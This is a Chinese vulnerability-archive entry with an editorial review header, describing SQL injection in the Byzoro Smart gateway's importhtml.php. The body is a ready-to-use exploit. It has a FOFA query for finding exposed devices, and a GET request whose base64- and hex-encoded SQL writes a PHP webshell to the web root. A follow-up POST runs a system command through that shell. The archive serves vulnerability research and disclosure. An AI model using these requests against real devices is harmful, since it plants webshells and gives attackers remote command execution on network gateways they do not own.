---
source: "wy876 漏洞文库"
id: "vw-d74fda5ba9a4c7c2cfec3aec"
entity_id: "ve-d74fda5ba9a4c7c2cfec3aec"
schema_version: "1"
title: "百卓Smart SQL命令注入漏洞"
product: "Byzoro Smart"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未给auth/版本；数据库可写Web目录"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%99%BE%E5%8D%93/%E7%99%BE%E5%8D%93SmartSQL%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gigpdn7864aou7y4"
source_status: "recorded"
---

# 百卓Smart SQL命令注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Byzoro Smart
- 本文讨论：importhtml.php sql任意SQL执行
- 版本、权限与配置前提：未给auth/版本；数据库可写Web目录
- 资料类型：任意SQL到文件写入PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 后续POST标Content-Length0却含cmd正文，原始请求无效
- 无输出、固定版本及FILE权限前提；与355同原语不同文件名
- 已落实的文本修订：“Content-Length: 0”改为“Content-Length: 12”；HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留

### 待核与来源

- 数据库写权限及服务器PHP映射待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
百卓Smart是一种系列品牌上网行为管理设备，多种应用功能集于一身，包括网络应用封堵、流量控制、链路负载均衡、网页分类阻断、上网内容审计、防火墙、VPN等。该网关的管理组件文件 importhtml.php 的功能处理逻辑，对参数 sql 的传参处过滤不严，导致任意SQL语句的执行，造成任意恶意文件的写入。

# 二、影响版本
+ 百卓Smart

# 三、资产测绘
+ fofa`app="byzoro-Smart"`
+ 特征


# 四、漏洞复现
```http
GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvcy5waHAn HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```


写入文件位置

```http
POST /app/s.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

cmd=ifconfig
```


其中`c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvcy5waHAn`为以下代码的base64编码

```plain
select 0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e into outfile '/usr/hddocs/nsg/app/s.php'
```

`0x3c3f706870206563686f2073797374656d28245f504f53545b22636d64225d293b3f3e`为webshell hex编码

hex解密网站`[https://www.bejson.com/convert/ox2str/](https://www.bejson.com/convert/ox2str/)`


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gigpdn7864aou7y4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
